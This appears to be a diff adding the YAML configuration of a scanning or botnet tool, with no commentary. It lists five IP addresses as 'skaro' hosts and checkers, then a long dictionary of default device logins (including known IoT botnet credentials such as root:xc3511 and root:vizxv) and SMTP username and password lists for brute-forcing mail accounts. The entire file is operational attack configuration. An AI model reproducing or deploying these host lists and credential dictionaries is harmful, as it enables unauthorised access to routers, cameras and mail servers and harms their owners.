@@ -1,0 +1,163 @@
+---
+
+version: 30
+logging: no
+generation: 0
+
+
+skaro:
+  ips:
+    - "193.0.178.151"
+    - "46.8.44.55"
+    - "5.34.183.231"
+    - "185.82.216.125"
+    - "195.123.210.100"
+  ping: 60
+
+checkers:
+  - "http://193.0.178.151"
+  - "http://46.8.44.55"
+  - "http://5.34.183.231"
+  - "http://185.82.216.125"
+  - "http://195.123.210.100"
+  - "http://httpbin.org/ip"
+
+userpass: [
+  "root:qwerty",
+  "user:admin",
+  "ubnt:ubnt",
+  "root:12345",
+  "root:klv1234",
+  "guest:1234",
+  "user:user",
+  "root:1111",
+  "test:test",
+  "admin:123456",
+  "support:password",
+  "root:root",
+  "admin:1",
+  "test:test123",
+  "manager:manager",
+  "fax:fax",
+  "service:service",
+  "root:Zte521",
+  "root:letmein",
+  "sales:sales",
+  "guest:guest",
+  "shell:sh",
+  "enable:system",
+  "user:password",
+  "backup:backup",
+  "ftpuser:ftpuser",
+  "user:1234",
+  "admin:password123",
+  "root:pfsense",
+  "root:abc123",
+  "root:admin",
+  "support:support",
+  "root:anko",
+  "monitor:monitor",
+  "root:vizxv",
+  "bin:bin",
+  "root:ikwb",
+  "admin:manager",
+  "oracle:oracle",
+  "test:12345",
+  "bob:bob",
+  "user1:1234",
+  "user1:123456",
+  "root:",
+  "1:1",
+  "root:1",
+  "admin:default",
+  "support:123456",
+  "nagios:nagios",
+  "default:default",
+  "demo:demo",
+  "admin:1111",
+  "admin:password",
+  "PlcmSpIp:PlcmSpIp",
+  "pos:pos",
+  "support:12345",
+  "admin:smcadmin",
+  "root:baseball",
+  "root:0000",
+  "guest:12345",
+  "admin:1234",
+  "apache:apache",
+  "admin:",
+  "root:123456",
+  "administrator:password",
+  "admin:ubnt",
+  "admin:123321",
+  "adam:adam",
+  "root:alpine",
+  "root:54321",
+  "admin:support",
+  "anonymous:anonymous",
+  "root:juantech",
+  "tester:retset",
+  "admin:administrator",
+  "root:888888",
+  "root:pass",
+  "root:raspberry",
+  "nobody:nobody",
+  "pi:raspberry",
+  "admin:admin",
+  "debian:debian",
+  "root:root123",
+  "root:xc3511",
+  "administrator:1234",
+  "admin:root",
+  "admin:abc123",
+  "root:password",
+  "ftp:ftp",
+  "root:xmhdipc",
+  "test1:test1",
+  "admin:qwerty",
+  "root:openelec",
+  "admin:admin1234",
+  "shipping:shipping",
+  "supervisor:supervisor",
+  "root:1234",
+  "root:system",
+  "admin:12345",
+  "ftpuser:asteriskftp",
+  "root:default",
+  "root:666666",
+  "aPlcmSpIp:PlcmSpIp",
+  "admin:111",
+  "operator:operator",
+  "root:ubnt"
+]
+
+smtp:
+  usernames:
+    - jobs
+    - job
+    - hr
+    - info
+    - support
+    - root
+    - postmaster
+    - sales
+    - admin
+    - contact
+  passwords:
+    - info
+    - support
+    - password
+    - password1
+    - password2
+    - password3
+    - password0
+    - 0000
+    - 1111
+    - 1234
+    - 12345
+    - 123456
+    - 1234567
+    - 12345678
+    - 123456789
+    - qwerty
+    - 1qaz2wsx
